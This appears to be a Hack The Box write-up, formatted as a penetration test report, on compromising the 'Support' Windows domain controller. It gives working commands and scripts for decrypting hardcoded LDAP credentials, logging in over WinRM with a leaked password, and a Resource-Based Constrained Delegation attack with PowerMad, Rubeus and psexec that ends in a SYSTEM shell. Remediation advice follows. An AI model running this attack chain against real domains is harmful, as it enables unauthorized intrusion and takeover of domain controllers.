# Penetration Test Report — Support

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows%20AD-blue) ![Focus](https://img.shields.io/badge/focus-.NET%20RE%20%2F%20RBCD-red)

## Executive Summary

An authorized assessment of `target.htb` (Domain Controller, `support.htb`) began with an anonymous SMB share containing a custom .NET utility. Reverse engineering recovered the utility's hardcoded LDAP bind credentials. LDAP enumeration disclosed a password in the `info` attribute of the `support` user, enabling WinRM access. BloodHound revealed that the **Shared Support Accounts** group holds GenericAll over the Domain Controller, enabling a **Resource-Based Constrained Delegation (RBCD)** attack and a shell as `NT AUTHORITY\SYSTEM`.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Anonymous SMB share with internal tooling | Medium |
| 2 | Hardcoded LDAP credentials in .NET binary (XOR-obfuscated) | High |
| 3 | Password stored in user `info` attribute | Critical |
| 4 | GenericAll over the Domain Controller (Shared Support Accounts) | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
nmap -sC -sV -Pn target.htb
smbclient -L \\\\target.htb\\
smbclient \\\\target.htb\\support-tools
```

The non-default `support-tools` share was anonymously accessible and contained `UserInfo.exe.zip` — a .NET assembly.

### 2. Recovering the LDAP Password

Decompiling with ILSpy revealed the bind logic: `LDAP://support.htb` as `support\ldap`, with the password returned by `Protected.getPassword()` — Base64 data XORed with key `armando` and byte `0xDF`. Decryption:

```python
import base64
from itertools import cycle
enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
res = ''.join(chr(e ^ k ^ 223) for e, k in zip(enc_password, cycle(key)))
print(res)  # nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

(Alternative: run the binary under Wine and capture the cleartext LDAP bind with Wireshark.)

### 3. Foothold — LDAP Enumeration

```bash
ldapsearch -h support.htb -D ldap@support.htb \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

The `support` user's `info` attribute contained `Ironside47pleasure40Watchful`, and the account was in **Remote Management Users**:

```bash
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

User flag: `C:\Users\Support\Desktop`.

### 4. Privilege Escalation — RBCD

SharpHound collection + BloodHound showed **Shared Support Accounts → GenericAll → DC**. Prerequisites checked out: `ms-ds-machineaccountquota = 10` and `msds-allowedtoactonbehalfofotheridentity` empty.

Create a fake computer (PowerMad) and configure delegation:

```powershell
. ./Powermad.ps1
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

Perform the S4U attack with Rubeus and import the ticket:

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

Convert the ticket and authenticate as Administrator:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

Shell as `NT AUTHORITY\SYSTEM`; root flag obtained.

## Remediation

- Remove anonymous share access; treat internal tools as sensitive.
- Never embed credentials in binaries — obfuscation is not protection.
- Scrub passwords from LDAP attributes; enable auditing on attribute reads.
- Remediate GenericAll over the DC; set `ms-ds-machineaccountquota` to 0; monitor RBCD attribute changes.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1552.001 — Credentials in Files / reverse engineering |
| Discovery | T1087.002 — Domain Account (LDAP) |
| Privilege Escalation | T1134.001 — Token Impersonation/Delegation (RBCD) |
| Lateral Movement | T1550.003 — Pass the Ticket |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
